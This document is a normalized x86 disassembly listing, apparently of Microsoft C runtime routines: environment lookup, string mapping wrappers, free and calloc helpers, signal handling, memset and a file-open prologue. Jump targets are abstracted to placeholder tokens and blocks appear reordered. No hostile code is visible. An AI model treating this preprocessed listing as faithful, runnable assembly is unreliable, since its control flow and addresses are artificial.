xor eax eax
push [ ebp + 0x8 ]
call sub_410680
pop ecx
mov edi eax
jmp r-xdata
call sub_41e1f6
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_410680
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_41e1dc
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_41a397
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_410135
pop ecx
sub_41a3b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_41e28d
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e1e0
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_41e2d6
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_410135
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_410135
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_41a397
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_410212
pop ecx
cmp eax ebx
je r-xdata
call sub_41e490
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_414890
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_41e2d6
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_410212
pop ecx
cmp eax ebx
je r-xdata
call sub_41e490
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_41a397
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_41a397
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_410212
pop ecx
cmp eax ebx
je r-xdata
call sub_41e490
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_41a75c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41a3b7
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41a7a1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_41e28d
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e1e0
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_41e2d6
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_410135
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_414890
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_41a397
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_410212
pop ecx
cmp eax ebx
je r-xdata
call sub_41e490
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_41a95b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41a7a1
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41a99d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_410135
push [ esi + 0x8 ]
call sub_410135
push [ esi + 0xc ]
call sub_410135
push [ esi + 0x10 ]
call sub_410135
push [ esi + 0x14 ]
call sub_410135
push [ esi + 0x18 ]
call sub_410135
push [ esi ]
call sub_410135
push [ esi + 0x20 ]
call sub_410135
push [ esi + 0x24 ]
call sub_410135
push [ esi + 0x28 ]
call sub_410135
push [ esi + 0x2c ]
call sub_410135
push [ esi + 0x30 ]
call sub_410135
push [ esi + 0x34 ]
call sub_410135
push [ esi + 0x1c ]
call sub_410135
push [ esi + 0x38 ]
call sub_410135
push [ esi + 0x3c ]
call sub_410135
add esp 0x40
push [ esi + 0x40 ]
call sub_410135
push [ esi + 0x44 ]
call sub_410135
push [ esi + 0x48 ]
call sub_410135
push [ esi + 0x4c ]
call sub_410135
push [ esi + 0x50 ]
call sub_410135
push [ esi + 0x54 ]
call sub_410135
push [ esi + 0x58 ]
call sub_410135
push [ esi + 0x5c ]
call sub_410135
push [ esi + 0x60 ]
call sub_410135
push [ esi + 0x64 ]
call sub_410135
push [ esi + 0x68 ]
call sub_410135
push [ esi + 0x6c ]
call sub_410135
push [ esi + 0x70 ]
call sub_410135
push [ esi + 0x74 ]
call sub_410135
push [ esi + 0x78 ]
call sub_410135
push [ esi + 0x7c ]
call sub_410135
add esp 0x40
push [ esi + 0x80 ]
call sub_410135
push [ esi + 0x84 ]
call sub_410135
push [ esi + 0x88 ]
call sub_410135
push [ esi + 0x8c ]
call sub_410135
push [ esi + 0x90 ]
call sub_410135
push [ esi + 0x94 ]
call sub_410135
push [ esi + 0x98 ]
call sub_410135
push [ esi + 0x9c ]
call sub_410135
push [ esi + 0xa0 ]
call sub_410135
push [ esi + 0xa4 ]
call sub_410135
push [ esi + 0xa8 ]
call sub_410135
add esp 0x2c
sub_41ab32
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
push esi
call sub_410135
pop ecx
sub_41ab77
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_410135
pop ecx
push esi
call sub_410135
pop ecx
sub_41ac05
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_410cee
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
sub_41ac80
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41acc6
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_41ad90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_41add0
push 0xc
push r--data
call sub_4143e0
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_410cee
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_414425
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_417547
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_418538
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41aecc
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_414890
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_41aeee
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_4102dc
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_414004
pop ecx
mov ebx eax
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_414890
add esp 0xc
sub_41af87
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_41afcb
push 0x20
push r--data
call sub_4143e0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_4136a5
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_414425
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_41af87
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_41435d
mov [ ebp - 0x1c ] 0x1
push eax
call sub_413495
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_410cee
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40edf4
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_417d23
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_41348c
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b13f
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_41b1a8
push 0x10
push r--data
call sub_4143e0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_414425
retn
sub_41b208
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41b25f
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_41b25f
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_41b208
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41b2ee
push 0x10
push r--data
call sub_4143e0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b384
mov eax [ ebp - 0x1c ]
call sub_414425
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40fc45
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_410135
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_41b38d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_41e72e
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
